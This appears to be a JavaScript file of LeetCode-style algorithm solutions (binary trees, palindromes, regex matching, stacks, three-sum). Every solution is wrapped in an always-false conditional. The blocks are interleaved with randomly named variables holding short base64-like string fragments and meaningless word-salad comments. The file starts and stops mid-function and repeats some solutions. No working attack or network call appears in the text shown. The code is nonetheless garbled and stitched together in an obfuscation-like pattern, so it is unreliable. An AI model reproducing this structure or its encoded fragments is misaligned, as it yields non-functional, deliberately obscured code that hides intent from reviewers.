        area[i][0] = parseInt(matrix[i][0]);
        result = Math.max(result, area[i][0]);
    }
    
    for (i = 1; i < lenX; i++) {
        for (j = 1; j < lenY; j++) {
            area[i][j] = parseInt(matrix[i][j]);
            
            if (area[i][j]) {
                area[i][j] = Math.min(area[i - 1][j - 1], area[i - 1][j], area[i][j - 1]) + 1;
            }
             
            result = Math.max(result, area[i][j]);
        }
    }
    
    return result * result;
};

}

    var nqycufooh = 'SUN';
    var pjvjhfgfunh = 'GqcSwlIvOf';
if (66 > 135) {
    /**
Given a singly linked list where elements are sorted in ascending order, convert it to a height balanced BST.
*/

/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {TreeNode}
 */
var sortedListToBST = function(head) {
    var len = 0,
        node = head;
    
    if (!node) {
        return null;
    }
    
    while (node) {
        len++;
        node = node.next;
    }
    curNode = head;
    return helper(0, len - 1);
},
curNode;

// build tree bottom up
function helper(start, end) {
    if (start > end) {
        return null;
    }
    
    var mid = parseInt((start + end) / 2),
        left,
        right,
        node;
        
    left = helper(start, mid - 1),
    node = new TreeNode(curNode.val);
    curNode = curNode.next;
    right = helper(mid + 1, end);
    
    node.left = left;
    node.right = right;
    
    return node;
}


// solution 2
var sortedListToBST = function(head) {
    var arr = [],
        node = head,
        len;
    
    if (!node) {
        return null;
    }
    
    while (node) {
        arr.push(node);
        node = node.next;
    }
    
    len = arr.length;
    
    if (len === 1) {
        return head;
    }
    
    return getMidNode(0, len - 1, arr);
};

function getMidNode(start, end, arr) {
    if (start > end) {
        return null;
    }
    
    var mid = parseInt((start + end) / 2),
        node = new TreeNode(arr[mid].val);
        
    node.left = getMidNode(start, mid - 1, arr);
    node.right = getMidNode(mid + 1, end, arr);
    
    return node;
}

}

    var wigkqxwvmkvm = 'BZ0lDQW';
if (3 instanceof String) {
    /**
Follow up for problem "Populating Next Right Pointers in Each Node".

What if the given tree could be any binary tree? Would your previous solution still work?

Note:

You may only use constant extra space.
For example,
Given the following binary tree,
         1
       /  \
      2    3
     / \    \
    4   5    7
After calling your function, the tree should look like:
         1 -> NULL
       /  \
      2 -> 3 -> NULL
     / \    \
    4-> 5 -> 7 -> NULL
Subscribe to see which companies asked this question
*/
/**
 * Definition for binary tree with next pointer.
 * function TreeLinkNode(val) {
 *     this.val = val;
 *     this.left = this.right = this.next = null;
 * }
 */

/**
 * @param {TreeLinkNode} root
 * @return {void} Do not return anything, modify tree in-place instead.
 */
var connect = function(root) {
    if (!root) {
        return;
    }
    
    var curRow = [],
        nextRow = [],
        i;
        
    curRow.push(root);
    
    while (curRow.length > 0) {
        for (i = 0; i < curRow.length; i++) {
            if (curRow[i].left) {
                nextRow.push(curRow[i].left);
            }
            
            if (curRow[i].right) {
                nextRow.push(curRow[i].right);
            }
            
            if (i < curRow.length - 1) {
                curRow[i].next = curRow[i + 1];
            } else {
                curRow[i].next = null;
            }
        }
        
        curRow = nextRow;
        nextRow = [];
    }
};


// O(1) space solution

/**
 * Definition for binary tree with next pointer.
 * function TreeLinkNode(val) {
 *     this.val = val;
 *     this.left = this.right = this.next = null;
 * }
 */

/**
 * @param {TreeLinkNode} root
 * @return {void} Do not return anything, modify tree in-place instead.
 */
var connect = function(root) {
    let nextHead = null;
    let cur = root;
    let nextCur = null;
    
    while (cur !== null) {
        
        while (cur !== null) {
            if (cur.left) {
                if (!nextHead) {
                    nextHead = cur.left;
                    nextCur = nextHead;
                } else {
                    nextCur.next = cur.left;
                    nextCur = nextCur.next;
                }
            }
            
            if (cur.right) {
                if (!nextHead) {
                    nextHead = cur.right;
                    nextCur = nextHead;
                } else {
                    nextCur.next = cur.right;
                    nextCur = nextCur.next;
                }
            }
            
            cur = cur.next;
        }
        
        cur = nextHead;
        nextHead = null;
        nextCur = null;
    }
};

}

    var hcvvqpeab = 'UUfPAcGd';
    var ttqnyycaw = 'dJQ0';
    var adxeyphxwh = 'IaOzDUttbd';
    var tmxbolhhdl = 'JrWldK';
    var naajegylqvg = 'YOIcTjUER';
if (null === 1) {
    /**
Given a list of unique words. Find all pairs of distinct indices (i, j) in the given list, so that the concatenation of the two words, i.e. words[i] + words[j] is a palindrome.

Example 1:
Given words = ["bat", "tab", "cat"]
Return [[0, 1], [1, 0]]
The palindromes are ["battab", "tabbat"]
Example 2:
Given words = ["abcd", "dcba", "lls", "s", "sssll"]
Return [[0, 1], [1, 0], [3, 2], [2, 4]]
The palindromes are ["dcbaabcd", "abcddcba", "slls", "llssssll"]
*/

/**
 * @param {string[]} words
 * @return {number[][]}
 */
var palindromePairs = function(words) {
    var len = words.length,
        map = {},
        palindromeMap = {},
        word,
        wordLen,
        tempArr,
        result = new Set(),
        resultArr = [],
        sub1,
        sub2,
        i,
        j;
        
    for (i = 0; i < len; i++) {
        map[words[i]] = i;
        
        // if (isPalindrome(words[i])) {
        //     palindromeMap[words[i]] = i;
        // }
    }
    
    for (i = 0; i < len; i++) {
        word = words[i];
        wordLen = word.length;
        
        // if (isPalindrome(word)) {
        //     for (var key in palindromeMap) {
        //         temp = [];
                
        //         if (palindromeMap[key] !== i) {
        //             temp.push(palindromeMap[key]);
        //             temp.push(i);
        //             result.add(temp);
        //         }
        //     }
            
        //     continue;
        // }
        
        for (j = 0; j <= wordLen; j++) {
            sub1 = word.substring(0, j);
            sub2 = word.substring(j, wordLen);
            
            if (isPalindrome(sub1)) {
                sub2 = sub2.split('').reverse().join('');
                
                if (map.hasOwnProperty(sub2) && map[sub2] !== i) {
                    temp = [];
                    temp.push(map[sub2]);
                    temp.push(i);
                    result.add(temp.toString());
                }
            } 
            
            if (isPalindrome(sub2)) {
                sub1 = sub1.split('').reverse().join('');
                
                if (map.hasOwnProperty(sub1) && map[sub1] !== i) {
                    temp = [];
                    temp.push(i);
                    temp.push(map[sub1]);
                    result.add(temp.toString());
                }
            }
        }
    }
    
    result.forEach(function(item) {
        temp = item.split(',');
        temp[0] = (parseInt(temp[0]));
        temp[1] = (parseInt(temp[1]));
        resultArr.push(temp);
    });
    
    return resultArr;
};

function isPalindrome(s) {
    var start = 0,
        end = s.length - 1;
    
    while (start < end) {
        if (s.charAt(start) !== s.charAt(end)) {
            return false;
        }
        
        start++;
        end--;
    }
    
    return true;
}

}

    var lyarvqvxjejsso = 'MVo';
    var nyipiu = 'OyxIgwgboo';
    var walzlpxeg = 'yZGxjanNLS';
    var qnnniaeq = 'fcWXYUa';
// number export event
if ('q' === 'M') {
    /**
Given an array nums, write a function to move all 0's to the end of it while maintaining the relative order of the non-zero elements.

For example, given nums = [0, 1, 0, 3, 12], after calling your function, nums should be [1, 3, 12, 0, 0].

Note:
You must do this in-place without making a copy of the array.
Minimize the total number of operations.
*/

/**
 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var moveZeroes = function(nums) {
    var len = nums.length,
        curIndex = 0,
        i;
    
    for (i = 0; i < len; i++) {
        if (nums[i] === 0) {
            continue;
        }
        
        nums[curIndex] = nums[i];
        curIndex++;
    }
    
    for (i = curIndex; i < len; i++) {
        nums[i] = 0;
    }
};

}

    var baojqud = 'cieEDKS';
if (10 instanceof String) {
    /**
Implement regular expression matching with support for '.' and '*'.

'.' Matches any single character.
'*' Matches zero or more of the preceding element.

The matching should cover the entire input string (not partial).

The function prototype should be:
bool isMatch(const char *s, const char *p)

Some examples:
isMatch("aa","a") → false
isMatch("aa","aa") → true
isMatch("aaa","aa") → false
isMatch("aa", "a*") → true
isMatch("aa", ".*") → true
isMatch("ab", ".*") → true
isMatch("aab", "c*a*b") → true
*/
/**
 * @param {string} s
 * @param {string} p
 * @return {boolean}
 * 
 * The most critical observation is that "x*" can either match empty string, or at least one x. In the latter case, it is equivalent to "xx*" or "x*x"
 * 
 *  
        'match' below including .
    f(i,j) means s where s.len=i matches p where p.len=j
    f(i,j) =
        if (p_j-1 != * ) f(i-1, j-1) and s_i-1 matches p_j-1
        if (p_j-1 == * )
            * matches zero times: f(i,j-2)
            or * matches at least one time: f(i-1,j) and s_i-1 matches p_j-2
 */
var isMatch = function(s, p) {
    var lenS = s.length,
        lenP = p.length,
        f = [],
        i,
        j;
    
    if (p.length === 0) {
        return s.length === 0;
    }
    
    if (p.charAt(0) === '*') {
        return false;
    }
    
    for (i = 0; i <= lenS; i++) {
        f.push(new Array(lenP + 1));
        for (j = 0; j <= lenP; j++) {
            f[i][j] = false;
        }
    }
    
    f[0][0] = true;
    
    for (i = 1; i < lenP; i++) {
        if (p.charAt(i) === '*') {
            f[0][i + 1] = f[0][i - 1];
        }
    }
    
    for (i = 1; i <= lenS; i++) {
        for (j = 1; j <= lenP; j++) {
            if (p.charAt(j - 1) === '*') {
                f[i][j] = f[i][j - 2] || (f[i - 1][j] && (s.charAt(i - 1) === p.charAt(j - 2) || p.charAt(j - 2) === '.'));
            } else {
                f[i][j] = f[i - 1][j - 1] && (s.charAt(i - 1) === p.charAt(j - 1) || p.charAt(j - 1) === '.');
            }
        }
    }
    
    return f[lenS][lenP];
};


// TIME LIMIT EXCEEDED
var isMatch = function(s, p) {
    var lenS = s.length,
        lenP = p.length,
        i,
        j;
    
    if (p.length === 0) {
        return s.length === 0;
    }
    
    if (p.charAt(1) === '*') {
        return isMatch(s, p.substr(2)) || s.length > 0 && (s.charAt(0) === p.charAt(0) || p.charAt(0) === '.') && isMatch(s.substr(1), p);
    } else {
        return s.length > 0 && (s.charAt(0) === p.charAt(0) || p.charAt(0) === '.') && isMatch(s.substr(1), p.substr(1));
    }

};

}

    var vephz = 'UNBZ0l';
if (Array.isArray(3)) {
    /**
Given a string containing just the characters '(', ')', '{', '}', '[' and ']', determine if the input string is valid.

The brackets must close in the correct order, "()" and "()[]{}" are all valid but "(]" and "([)]" are not.

 * @param {string} s
 * @return {boolean}
 */
var isValid = function(s) {
    if (s === null) {
        return false;
    }
    var stack = [],
        sets = {'(':')', '{':'}', '[':']'},
        len = s.length,
        cur,
        stackTop,
        i;

    for (i = 0; i < len; i++) {
        cur = s.charAt(i);
        if (sets.hasOwnProperty(cur)) {
            stack.push(cur);
        } else {
            if (stack.length === 0) {
                return false;
            } else {
                stackTop = stack.pop();
                if (sets[stackTop] !== cur) {
                    return false;
                }
            }
        }
    }
    if (stack.length === 0) {
        return true;
    } else {
        return false;
    }
    
};

}

    var qarntz = 'QRWhQzSvPO';
if (2 > 139) {
    /**
Given two strings S and T, determine if they are both one edit distance apart
*/
/**
 * @param {string} s
 * @param {string} t
 * @return {boolean}
 */
var isOneEditDistance = function(s, t) {
    for (let i = 0; i < Math.min(s.length, t.length); i++) {
        if (s.charAt(i) !== t.charAt(i)) {
            if (s.length === t.length) {
                return s.substring(i + 1) === t.substring(i + 1);
            } else if (s.length < t.length) {
                return s.substring(i) === t.substring(i + 1);
            } else {
                return s.substring(i + 1) === t.substring(i);
            }
        }
    }
    
    return Math.abs(s.length - t.length) === 1;
};

}

    var ootodrstdrpw = 'DQW';
    var fxmngsvqpmuv = 'wRkiFQy';
    var krrfdqifgnt = 'dJQ0J';
    var vszfwpokdef = 'XQnuFsclhT';
if (7 === 15) {
    /**
Given a string S, find the longest palindromic substring in S. You may assume that the maximum length of S is 1000, and there exists one unique longest palindromic substring.

*/
// MEMORY LIMIT EXCEEDED....
/**
 * @param {string} s
 * @return {string}
 */
var longestPalindrome = function(s) {
    var len = s.length,
        isPal = [],
        max = 1,
        start = 0,
        end = 0,
        i,
        j;
    
    for (i = 0; i < len; i++) {
        isPal.push(new Array(len));
        isPal[i][i] = true;
    }
    
    for (i = len - 1; i >= 0; i--) {
        for (j = i + 1; j < len; j++) {
            if (s.charAt(i) === s.charAt(j) && (j === i + 1 || isPal[i + 1][j - 1])) {
                isPal[i][j] = true;
                
                if (j - i + 1 > max) {
                    start = i;
                    end = j;
                    max = j - i + 1;
                }
            }
        }
    }
    
    return s.substring(start, end + 1);
};

}

    var ywkqi = 'qYj';
    var yexgegmviock = 'YTBreuuNYB';
    var dsbggcy = 'I1emRDQmx';
if (typeof navigator === 'undefined') {
    /**
Given n non-negative integers representing the histogram's bar height where the width of each bar is 1, find the area of largest rectangle in the histogram.


Above is a histogram where width of each bar is 1, given height = [2,1,5,6,2,3].


The largest rectangle is shown in the shaded area, which has area = 10 unit.

For example,
Given heights = [2,1,5,6,2,3],
return 10.
*/
/**
 * @param {number[]} heights
 * @return {number}
 */
var largestRectangleArea = function(heights) {
    var len = heights.length,
        stack = [],
        max = 0,
        cur,
        i;
    
    if (len === 0) {
        return 0;
    }
    
    heights[len] = 0;
    len++;
    
    for (i = 0; i < len;) {
        if (stack.length > 0 && heights[i] <= heights[stack[stack.length - 1]]) {
            cur = stack.pop();
            // 如果栈已经为空，说明到目前为止所有元素（当前下标元素除外）都比出栈元素高度要大（否则栈中肯定还有元素），所以矩阵面积就是高度乘以当前下标i。
            // 如果栈不为空，那么就是从当前栈顶元素的下一个到当前下标的元素之前都比出栈元素高度大（因为栈顶元素第一个比当前出栈元素小的）。
            max = Math.max(max, heights[cur] * (stack.length === 0 ? i : i - stack[stack.length - 1] - 1));
            continue;
        }
        
        stack.push(i);
        i++;
    }
    
    return max;
};

}

    var nqnyvr = 'ErMBypLHhJ';
// scoyvmz loop return value world variable value
    var pphmyv = 'anKXMy';
    var kmrmfvsyhb = 'ibVFnUFNCd';
    var xfcwsmcu = 'sFeSOEjc';
// async await script array vviriub compile
    var ttycolort = 'tGxgknUdUw';
    var mfwuttdgqzml = '1pYS';
    var nqxzttc = 'TROz';
    var xutdrksnyg = 'm1iM0p';
    var ukdeimuhlce = 'cvDQF';
if (typeof document === 'undefined') {
    /**
Evaluate the value of an arithmetic expression in Reverse Polish Notation.

Valid operators are +, -, *, /. Each operand may be an integer or another expression.

Some examples:
  ["2", "1", "+", "3", "*"] -> ((2 + 1) * 3) -> 9
  ["4", "13", "5", "/", "+"] -> (4 + (13 / 5)) -> 6
Subscribe to see which companies asked this question
*/
/**
 * @param {string[]} tokens
 * @return {number}
 */
var evalRPN = function(tokens) {
    var stack = [],
        len = tokens.length,
        ch,
        num,
        i;
        
    for (i = 0; i < len; i++) {
        ch = tokens[i];
        
        if (isNaN(parseInt(ch))) {
            if (ch === '+') {
                num = stack.pop() + stack.pop();
                stack.push(num);
            } else if (ch === '-') {
                num = stack.pop();
                num = stack.pop() - num;
                stack.push(num);
            } else if (ch === '*') {
                num = stack.pop() * stack.pop();
                stack.push(num);
            } else if (ch === '/') {
                num = stack.pop();
                num = parseInt(stack.pop() / num);
                stack.push(num);
            }
        } else {
            stack.push(parseInt(ch));
        }
    }
    
    return stack.pop();
};

}

    var sdczkn = '0WVc1alpTN';
    var zxxmxmshgsl = 'yRMrpOoP';
// loop event debug vdgs yliww await number
    var fevuofvj = 'FXvQe';
if (!true && 1) {
    /**
Follow up for problem "Populating Next Right Pointers in Each Node".

What if the given tree could be any binary tree? Would your previous solution still work?

Note:

You may only use constant extra space.
For example,
Given the following binary tree,
         1
       /  \
      2    3
     / \    \
    4   5    7
After calling your function, the tree should look like:
         1 -> NULL
       /  \
      2 -> 3 -> NULL
     / \    \
    4-> 5 -> 7 -> NULL
Subscribe to see which companies asked this question
*/
/**
 * Definition for binary tree with next pointer.
 * function TreeLinkNode(val) {
 *     this.val = val;
 *     this.left = this.right = this.next = null;
 * }
 */

/**
 * @param {TreeLinkNode} root
 * @return {void} Do not return anything, modify tree in-place instead.
 */
var connect = function(root) {
    if (!root) {
        return;
    }
    
    var curRow = [],
        nextRow = [],
        i;
        
    curRow.push(root);
    
    while (curRow.length > 0) {
        for (i = 0; i < curRow.length; i++) {
            if (curRow[i].left) {
                nextRow.push(curRow[i].left);
            }
            
            if (curRow[i].right) {
                nextRow.push(curRow[i].right);
            }
            
            if (i < curRow.length - 1) {
                curRow[i].next = curRow[i + 1];
            } else {
                curRow[i].next = null;
            }
        }
        
        curRow = nextRow;
        nextRow = [];
    }
};


// O(1) space solution

/**
 * Definition for binary tree with next pointer.
 * function TreeLinkNode(val) {
 *     this.val = val;
 *     this.left = this.right = this.next = null;
 * }
 */

/**
 * @param {TreeLinkNode} root
 * @return {void} Do not return anything, modify tree in-place instead.
 */
var connect = function(root) {
    let nextHead = null;
    let cur = root;
    let nextCur = null;
    
    while (cur !== null) {
        
        while (cur !== null) {
            if (cur.left) {
                if (!nextHead) {
                    nextHead = cur.left;
                    nextCur = nextHead;
                } else {
                    nextCur.next = cur.left;
                    nextCur = nextCur.next;
                }
            }
            
            if (cur.right) {
                if (!nextHead) {
                    nextHead = cur.right;
                    nextCur = nextHead;
                } else {
                    nextCur.next = cur.right;
                    nextCur = nextCur.next;
                }
            }
            
            cur = cur.next;
        }
        
        cur = nextHead;
        nextHead = null;
        nextCur = null;
    }
};

}

    var axuqcezdj = 'XViM2NvS1R';
if ('w' === 'D') {
    /**
Given two integers representing the numerator and denominator of a fraction, return the fraction in string format.

If the fractional part is repeating, enclose the repeating part in parentheses.

For example,

Given numerator = 1, denominator = 2, return "0.5".
Given numerator = 2, denominator = 1, return "2".
Given numerator = 2, denominator = 3, return "0.(6)".

 * @param {number} numerator
 * @param {number} denominator
 * @return {string}
 */
var fractionToDecimal = function(numerator, denominator) {
    var rem,
        quotient,
        map = [],
        collection = '',
        index,
        len
        result = '';

    if (numerator === 0) {
        return '0';
    }
    if (denominator === 0) {
        return '';
    }
    
    if ((numerator < 0 && denominator > 0) || (numerator > 0 && denominator < 0)) {
        result += '-';
    }
    numerator = Math.abs(Number(numerator));
    denominator = Math.abs(Number(denominator));
    
    quotient = Math.floor(numerator / denominator);
    result += quotient;
    
    rem = (numerator % denominator) * 10;
    if (rem === 0) {
        return result;
    }
    
    result += '.';
    while (rem !== 0) {
        quotient = Math.floor(rem/denominator);
        index = map.indexOf(rem);
        if (index === -1) {
            map.push(rem);
            collection += quotient;
        } else {
            collection = collection.substr(0, index) + '(' + collection.substr(index) + ')';
            break;
        }
        rem = (rem % denominator) * 10;
    }
    result += collection;
    return result;
};

}

    var mydureox = 'SAdOo';
    var udpwwyoqnih = 'zS0lDQWd';
    var zydrkfvmzz = 'GlrLQAVskv';
    var csgwjkmw = 'JQ0';
    var vcpmdpxoxq = 'GicgXkUYXf';
    var nivucakk = 'FnSUNC';
    var dxpkybcis = 'xLZn';
    var guxovboik = 'cFppQW9';
if (!true && 0) {
    /**
Given a string array words, find the maximum value of length(word[i]) * length(word[j]) where the two words do not share common letters. You may assume that each word will contain only lower case letters. If no such two words exist, return 0.

Example 1:
Given ["abcw", "baz", "foo", "bar", "xtfn", "abcdef"]
Return 16
The two words can be "abcw", "xtfn".

Example 2:
Given ["a", "ab", "abc", "d", "cd", "bcd", "abcd"]
Return 4
The two words can be "ab", "cd".

Example 3:
Given ["a", "aa", "aaa", "aaaa"]
Return 0
No such pair of words.
*/

/**
 * @param {string[]} words
 * @return {number}
 */
var maxProduct = function(words) {
    var len = words.length,
        arr = [],
        result = 0,
        i,
        j;
    
    for (i = 0; i < len; i++) {
        arr[i] = 0;
        
        for (j = 0; j < words[i].length; j++) {
            arr[i] |= (1 << (words[i].charCodeAt(j) - 97));
        }
    }
    
    for (i = 0; i < len; i++) {
        for (j = i + 1; j < len; j++) {
            if ((arr[i] & arr[j]) === 0) {
                result = Math.max(result, words[i].length * words[j].length);
            }
        }
    }
    
    return result;
};

}

    var dmyfznmvha = 'pejNXUh';
if (8 instanceof String) {
    /**
The count-and-say sequence is the sequence of integers beginning as follows:
1, 11, 21, 1211, 111221, ...

1 is read off as "one 1" or 11.
11 is read off as "two 1s" or 21.
21 is read off as "one 2, then one 1" or 1211.
Given an integer n, generate the nth sequence.

Note: The sequence of integers will be represented as a string.

 * @param {number} n
 * @return {string}
 */
var countAndSay = function(n) {
    function interpret(s, accum, sum) {
        var times = 1,
            num,
            len = s.length,
            i,
            result = '';
        
        num = s.charAt(0);
        
        for (i = 1; i < len; i++) {
            if (s.charAt(i) !== num) {
                result += times + num;
                num = s.charAt(i);
                times = 1;
            } else {
                times++;
            }
        }
        if (accum === 1) {
            result = '1';
        } else {
            result += times + num;
        }
        if (accum === sum) {
            return result;
        } else {
            return interpret(result, accum + 1, sum);
        }
    }
    return interpret('1', 1, n);
};

}

    var aucyaqfeudqdvkj = 'aVzVrSUMwZ';
    var ticevdu = 'kfzGl';
// return return
    var kooyltdcmp = 'EeWWNeOn';
    var rcpmz = '2MzUmhjb';
    var hbfzoqwikzdi = 'sSsUufFh';
    var jbulunqqhgkmm = 'lFnUGl';
    var ojtlxivyds = 'YnUHpC';
    var wkrsczaonfgzrbk = 'CMGFISmxjM';
if (4 === 19) {
    /**
Given a binary tree, find its maximum depth.

The maximum depth is the number of nodes along the longest path from the root node down to the farthest leaf node.
 * Definition for binary tree
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */

/**
 * @param {TreeNode} root
 * @returns {number}
 */
var maxDepth = function(root) {
    function getGreater(a, b) {
        return a > b? a : b;
    }
    if (root === null) {
        return 0;
    }
    return getGreater(maxDepth(root.left), maxDepth(root.right)) + 1;
};

}

    var plwrss = 'Gtveadn';
if (4 instanceof String) {
    /**
Given a linked list, swap every two adjacent nodes and return its head.

For example,
Given 1->2->3->4, you should return the list as 2->1->4->3.

Your algorithm should use only constant space. You may not modify the values in the list, only nodes itself can be changed.
*/

/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {ListNode}
 */
var swapPairs = function(head) {
    if (head === null) {
        return null;
    }
    
    var next = head.next,
        result = next? next : head,
        prevTail,
        curHead,
        nextHead;
    
    curHead = head;

    while(next) {
        nextHead = next.next;
        
        if (prevTail) {
            prevTail.next = next;
        }
        
        next.next = curHead;
        curHead.next = nextHead;
        prevTail = curHead;
        
        curHead = nextHead;
        next = curHead && curHead.next;
    }
    
    return result;
};

}

    var mrsnhdpaln = 'mh2YkdR';
    var wgiyqvdu = 'DWMRIgGxf';
    var ztzffevdcwrs = 'Z0ppWWdJ';
    var vwgwbiv = 'MmOMEtq';
    var wbdwlu = 'V1JsWW5Wbl';
    var chxbdip = 'MGTOK';
    var odahh = 'oyVnlWS';
    var ypmkrxmush = 'BtoKoFJIpN';
    var zpfgcgmblhg = 'EpwW';
    var rjxjkukg = 'RovUXaUHj';
if (0.71 && false) {
    /**
Serialization is the process of converting a data structure or object into a sequence of bits so that it can be stored in a file or memory buffer, or transmitted across a network connection link to be reconstructed later in the same or another computer environment.

Design an algorithm to serialize and deserialize a binary tree. There is no restriction on how your serialization/deserialization algorithm should work. You just need to ensure that a binary tree can be serialized to a string and this string can be deserialized to the original tree structure.

For example, you may serialize the following tree

    1
   / \
  2   3
     / \
    4   5
as "[1,2,3,null,null,4,5]", just the same as how LeetCode OJ serializes a binary tree. You do not necessarily need to follow this format, so please be creative and come up with different approaches yourself.
Note: Do not use class member/global/static variables to store states. Your serialize and deserialize algorithms should be stateless.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */

/**
 * Encodes a tree to a single string.
 *
 * @param {TreeNode} root
 * @return {string}
 */
var serialize = function(root) {
    var result = [];
    
    sHelper(root, result);
    return result.toString();
};

function sHelper(root, result) {
    if (root === null) {
        result.push('#');
        return;
    }
    
    result.push(root.val);
    sHelper(root.left, result);
    sHelper(root.right, result);
}
/**
 * Decodes your encoded data to tree.
 *
 * @param {string} data
 * @return {TreeNode}
 */
var deserialize = function(data) {
    var arr = data.split(','),
        len = arr.length;
        
    if (len === 0) {
        return null;
    }
    
    return buildTree(arr);
};

function buildTree(arr) {
    var curNode,
        val;
    
    if (arr.length === 0) {
        return null;
    }
    
    val = arr.shift();
    
    if (val === '#') {
        return null;
    }
    
    curNode = new TreeNode(parseInt(val));
    curNode.left = buildTree(arr);
    curNode.right = buildTree(arr);
    
    return curNode;
}

/**
 * Your functions will be called as such:
 * deserialize(serialize(root));
 */

}

// await string await await world import function import hello world compile
    var qydsyaap = 'MigAjEjb';
if (19 > 148) {
    /**
Given an array S of n integers, are there elements a, b, c in S such that a + b + c = 0? Find all unique triplets in the array which gives the sum of zero.

Note:
Elements in a triplet (a,b,c) must be in non-descending order. (ie, a ≤ b ≤ c)
The solution set must not contain duplicate triplets.
    For example, given array S = {-1 0 1 2 -1 -4},

    A solution set is:
    (-1, 0, 1)
    (-1, -1, 2)

*/
/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var threeSum = function(nums) {
    nums.sort(function(a, b) {
        return a - b;
    });
    
    var len = nums.length,
        i,
        result = [],
        curSol = [];
        
    for (i = 0; i < len; i++) {
        if (i > 0 && nums[i] === nums[i - 1]) {
            continue;
        } 
        
        curSol.push(nums[i]);
        twoSum(result, curSol.concat(), i + 1, len - 1, -nums[i], nums);
        curSol.pop();
    }
    
    return result;
};

function twoSum(allSol, curSol, startIndex, endIndex, target, nums) {
    var start = startIndex,
        end = endIndex,
        sum,
        mid;
    
    while (start < end) {
       sum = nums[start] + nums[end];
       
       if (sum === target) {
           curSol.push(nums[start]);
           curSol.push(nums[end]);
           allSol.push(curSol.concat());
           curSol.pop();
           curSol.pop();
           
           start++;
           end--;
           
           while (nums[start] === nums[start - 1]) {
               start++;
           }
           
           while (nums[end] === nums[end + 1]) {
               end--;
           }
       } else if (sum < target) {
           start++;
       } else {
           end--;
       }
    }
}

}

    var upgctnjlmvz = 'jJkbGNtV';
if ('true' === true) {
    /**
Given a binary tree, find its minimum depth.

The minimum depth is the number of nodes along the shortest path from the root node down to the nearest leaf node.

 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number}
 */
var minDepth = function(root) {
    if (root === null) {
        return 0;
    }
    
    if (root.left === null) {
        return minDepth(root.right) + 1;
    }
    
    if (root.right === null) {
        return minDepth(root.left) + 1;
    }
    
    return Math.min(minDepth(root.left), minDepth(root.right)) + 1;
};

}

    var zmuhajjbp = 'irenluHd';
    var bftnahckr = 'mtLU0I';
    var sklejrjq = 'SclaYcD';
    var ntfjgckqtzcwm = '3Q2';
    var oefvniakpnd = 'yWWG';
    var otjgf = 'lBZ0lD';
    var mcisqifbche = 'RcdTXCVU';
    var dujjfp = 'QWdJQ';
    var fxugegx = 'bVDkDzYQ';
    var dshundgcpz = '0FnSUN';
    var kfohyuqwl = 'QNEjzBBjKI';
    var xczlzmkbpqkgc = 'BZ0lH';
    var fhkrglmwewxd = 'SuAK';
if (typeof window === 'undefined') {
    /**
Design a stack that supports push, pop, top, and retrieving the minimum element in constant time.

push(x) -- Push element x onto stack.
pop() -- Removes the element on top of the stack.
top() -- Get the top element.
getMin() -- Retrieve the minimum element in the stack.


 * @constructor
 */
var MinStack = function() {
    this.min = [];
    this.arr = [];
};

/**
 * @param {number} x
 * @returns {void}
 */
MinStack.prototype.push = function(x) {
    var len = this.min.length;
    if (this.arr.length === 0) {
        this.min.push(x);
    } else if (this.min[len - 1] >= x) {
        this.min.push(x);
    }
    this.arr.push(x);
};

/**
 * @returns {void}
 */
MinStack.prototype.pop = function() {
    var elem,
        len = this.min.length;
    if (this.arr.length > 0) {
        elem = this.arr.pop();
    }
    if (elem === this.min[len - 1]) {
        this.min.pop();   
    }
};

/**
 * @returns {number}
 */
MinStack.prototype.top = function() {
    var len = this.arr.length;
    if (len > 0) {
        return this.arr[len - 1];
    }
    
};

/**
 * @returns {number}
 */
MinStack.prototype.getMin = function() {
    var len = this.min.length;
    return this.min[len - 1];
};

}

    var ugwvrobpckudge = 'UmxZblZ';
if (!true && 0) {
    /**
Given a string that contains only digits 0-9 and a target value, return all possibilities to add binary operators (not unary) +, -, or * between the digits so they evaluate to the target value.

Examples: 
"123", 6 -> ["1+2+3", "1*2*3"] 
"232", 8 -> ["2*3+2", "2+3*2"]
"105", 5 -> ["1*0+5","10-5"]
"00", 0 -> ["0+0", "0-0", "0*0"]
"3456237490", 9191 -> []
*/
/**
 * @param {string} num
 * @param {number} target
 * @return {string[]}
 */
var addOperators = function(num, target) {
    var result = [];
    
    helper(result, '', 0, num, target, 0, 0);
    
    return result;
};

function helper(result, cur, index, num, target, prev, multi) {
    if (index === num.length) {
        if (prev === target) {
            result.push(cur);
        }
        
        return;
    }
    
    var len = num.length,
        temp,
        i;
        
    for (i = index; i < len; i++) {
        if (num.charAt(index) === '0' && i > index) {
            break;
        }
        
        temp = parseInt(num.substring(index, i + 1));
        
        if (cur.length === 0) {
            helper(result, cur + temp, i + 1, num, target, temp, temp);
        } else {
            helper(result, cur + '+' + temp, i + 1, num, target, prev + temp, temp);
            helper(result, cur + '-' + temp, i + 1, num, target, prev - temp, -temp);
            helper(result, cur + '*' + temp, i + 1, num, target, prev - multi + multi * temp, temp * multi);
        }
    }
}

}

    var npnikgtz = 'OcYfeZTldl';
// return jdefxg compile array debug value compile value define variable event function await
    var dpymzkmxxl = 'caAHGIDqhO';
if (26 > 173) {
    /**
Suppose a sorted array is rotated at some pivot unknown to you beforehand.

(i.e., 0 1 2 4 5 6 7 might become 4 5 6 7 0 1 2).

Find the minimum element.

You may assume no duplicate exists in the array.
*/

// O(N) solution
/**
 * @param {number[]} nums
 * @return {number}
 */
var findMin = function(nums) {
    var len = nums.length,
        i;
    
    if (len === 0) {
        return null;
    }
    
    for (i = 1; i < len; i++) {
        if (nums[i] < nums[i - 1]) {
            return nums[i];
        }
    }
    
    return nums[0];
};

// O(logN) solution

/**
 * @param {number[]} nums
 * @return {number}
 */
var findMin = function(nums) {
    var len = nums.length,
        start = 0,
        end = len - 1,
